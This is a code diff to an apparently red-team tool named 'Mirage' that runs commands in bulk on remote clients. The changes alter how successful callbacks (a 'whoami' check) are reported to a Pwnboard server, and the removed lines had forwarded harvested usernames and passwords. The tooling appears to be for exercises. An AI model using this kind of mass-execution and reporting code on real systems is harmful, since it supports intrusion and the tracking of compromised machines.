@@ -193,25 +193,15 @@ def select_local_ip():
     
     return selected_ip
 
-def fwd_pwnboard(output):
+def fwd_pwnboard(target, response):
     print("\nForwarding valid callback to Pwnboard...")
-    print(output)
+    print(target)
+    print(response)
     return
-    # Format the string
-    split_msg = output.strip(" ") 
-    split_msg = output.split(":")
-    split_msg[2] = split_msg[2].strip("\n")
 
-    # 2 is IP, 0 is username, 1 is password
-    ip = split_msg[2]
-    user = split_msg[0]
-    pwd = split_msg[1]
-
-     # set up json
+    # Set up JSON Request
     data = {}
-    data["ip"] = ip
-    data["username"] = user
-    data["password"] = pwd
+    data["ip"] = target
     data["service"] = "Mirage"
     data["message"] = "Valid Callback Found"
 
@@ -222,7 +212,7 @@ def fwd_pwnboard(output):
 
     # Send and check result
     try:
-        result = requests.post(PWNBOARD_URL, headers=headers, data = payload, verify=False)
+        result = requests.post(PWNBOARD_URL, headers=headers, data=payload, verify=False)
         result.raise_for_status()
     except requests.exceptions.HTTPError as err:
         print(err)
@@ -402,8 +392,6 @@ def run_threads(clients, port, command, action_type="command", attacker_ip=None,
                         status_color = "#00ff00"  # Green
                         status_icon = "✅"
                         status_text = "SUCCESS"
-                        if callback == True:
-                            fwd_pwnboard(response)
                     elif isinstance(status, int) and 400 <= status < 600:
                         status_color = "#ff0000"  # Red
                         status_icon = "❌"
@@ -432,6 +420,13 @@ def run_threads(clients, port, command, action_type="command", attacker_ip=None,
                 
                 progress.update(main_task, advance=1)
     
+    # Send successful callbacks data to fwd_pwnboard
+    if callback:
+        successful_results = [r for r in results if r["color"] == "#00ff00"]
+        console.print(f"\n[bold #00ff00]Forwarding {len(successful_results)} successful results to pwnboard...[/bold #00ff00]")
+        for result in successful_results:
+            fwd_pwnboard(result["target"], result["response"])
+
     # Display results in a beautiful way
     display_results(results, action_type)
 
@@ -898,7 +893,7 @@ def main():
             )
             mass_execution(command)
         elif action == "CALLBACK":
-            command = "rem"
+            command = "whoami"
             mass_execution(command, callback=True)
         else:
             print("Unknown action, returning to menu.")
